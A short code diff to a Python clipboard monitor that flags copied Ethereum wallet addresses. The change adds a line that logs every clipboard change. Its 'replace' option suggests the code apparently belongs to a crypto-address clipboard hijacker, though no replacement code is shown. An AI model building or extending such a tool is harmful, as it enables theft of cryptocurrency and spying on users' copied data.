@@ -14,6 +14,7 @@ def clipboard_monitor(replace=False):
             text = pyperclip.paste()
             if text != last_text:
                 last_text = text
+                print(f"[+] Clipboard changed: {text}")  # Show every clipboard change
                 # Check for Ethereum address
                 if re.fullmatch(ETH_ADDRESS_REGEX, text.strip()):
                     print(f"[!] Detected wallet address: {text}")
